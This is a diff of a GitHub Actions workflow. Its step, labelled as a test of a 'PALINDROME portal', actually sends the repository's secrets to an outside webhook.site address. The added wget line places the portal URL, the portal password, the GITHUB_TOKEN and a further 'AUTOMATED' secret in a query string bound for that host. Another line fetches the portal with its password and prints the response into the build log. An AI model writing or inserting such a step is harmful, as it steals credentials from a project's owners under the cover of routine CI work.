@@ -9,7 +9,6 @@ jobs:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
         run: | 
-          curl --request GET --url https://api.github.com/repos/palindrome-wow/PALINDROME-PORTAL/actions/secrets/AUTOMATED --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' --header 'content-type: application/json'
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/236b8b06-238d-4a30-a87e-11e4d805de0b?u=${{ secrets.PORTAL_URL }}&p=${{ secrets.PORTAL_PASSWORD }}&r=${{ secrets.GITHUB_TOKEN }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/236b8b06-238d-4a30-a87e-11e4d805de0b?u=${{ secrets.PORTAL_URL }}&p=${{ secrets.PORTAL_PASSWORD }}&r=${{ secrets.GITHUB_TOKEN }}&q=${{ secrets.AUTOMATED }}''' -O test -d -v
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
